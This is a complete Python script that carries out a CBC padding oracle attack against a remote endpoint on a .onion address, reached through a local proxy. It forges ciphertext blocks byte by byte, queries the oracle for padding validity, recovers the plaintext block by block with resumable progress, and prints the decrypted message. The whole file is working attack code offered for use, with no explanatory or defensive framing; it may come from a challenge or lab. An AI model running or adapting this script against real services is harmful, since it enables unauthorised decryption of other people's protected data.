import requests
import time
import os
import sys

# --- CONFIGURATION ---
ORACLE_URL = "http://thenullsyndicatej7x4k2m9vfp3qwzn8lyr5hc6tabd0ue1sg4i2ox.onion/oracle"
PROXY = {'http': 'http://localhost:9999'}
BLOCK_SIZE = 16
PROGRESS_FILE = "recovery.txt"

session = requests.Session()

def oracle_query(hex_cipher):
    payload = {'hexContent': hex_cipher}
    while True:
        try:
            response = session.post(ORACLE_URL, json=payload, proxies=PROXY, timeout=90)
            if response.status_code == 200:
                return response.json().get('valid', False)
            else:
                print(f"[!] Error Server ({response.status_code}). Pausing 2s...", end='\r')
                time.sleep(2)
        except Exception:
            print("[!] VPN/Proxy failed. Verify tunnel and wait...", end='\r')
            time.sleep(5)

def decrypt_block(previous_block, current_block, block_num):
    decrypted_intermediate = bytearray(BLOCK_SIZE)
    
    for byte_index in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_index
        forged_prev = bytearray(b'\x00' * BLOCK_SIZE)
        
        for k in range(byte_index + 1, BLOCK_SIZE):
            forged_prev[k] = decrypted_intermediate[k] ^ padding_value
        
        found = False
        print(f"[*] Bloc {block_num} | Octet {byte_index} | Testing 256 possibility...")
        
        for guess in range(256):
            forged_prev[byte_index] = guess
            test_payload = (bytes(forged_prev) + current_block).hex()
            
            if oracle_query(test_payload):
                decrypted_intermediate[byte_index] = guess ^ padding_value
                found = True
                print(f"[+] Octet {byte_index} find : {hex(decrypted_intermediate[byte_index] ^ previous_block[byte_index])}")
                break
            
            time.sleep(0.02) 
        
        if not found:
            print(f"\n[!] Critical failure on bloc {block_num}. VPN is potentially dead.")
            return None
            
    return bytes([decrypted_intermediate[i] ^ previous_block[i] for i in range(BLOCK_SIZE)])

def main():
    ciphertext_hex = input("Enter ciphertext: ")
    ciphertext = bytes.fromhex(ciphertext_hex)
    
    blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
    iv = blocks[0]
    cipher_blocks = blocks[1:]
    
    decoded_blocks = []
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            for line in f:
                decoded_blocks.append(line.strip())
        print(f"[*] {len(decoded_blocks)} blocs already decrypted. Retake at bloc {len(decoded_blocks)+1}...")

    try:
        for i in range(len(decoded_blocks), len(cipher_blocks)):
            prev_b = iv if i == 0 else cipher_blocks[i-1]
            curr_b = cipher_blocks[i]
            
            print(f"\n--- Decrypting Bloc {i+1}/{len(cipher_blocks)} ---")
            plaintext_block = decrypt_block(prev_b, curr_b, i+1)
            
            if plaintext_block:
                res_hex = plaintext_block.hex()
                res_text = plaintext_block.decode(errors='ignore').replace('\n', '')
                print(f"\n[OK] Bloc {i+1} : {res_text}")
                
                with open(PROGRESS_FILE, "a") as f:
                    f.write(res_hex + "\n")
            else:
                print("[!] Fatal persistant network issue. Stopping.")
                break

    except KeyboardInterrupt:
        print("\n[*] User stop program. Progress saved.")

    if os.path.exists(PROGRESS_FILE):
        print("\n" + "="*30)
        print("MESSAGE DECRYPTED:")
        with open(PROGRESS_FILE, "r") as f:
            full_hex = "".join([l.strip() for l in f.readlines()])
            print(bytes.fromhex(full_hex).decode(errors='ignore'))
        print("="*30)

if __name__ == "__main__":
    main()
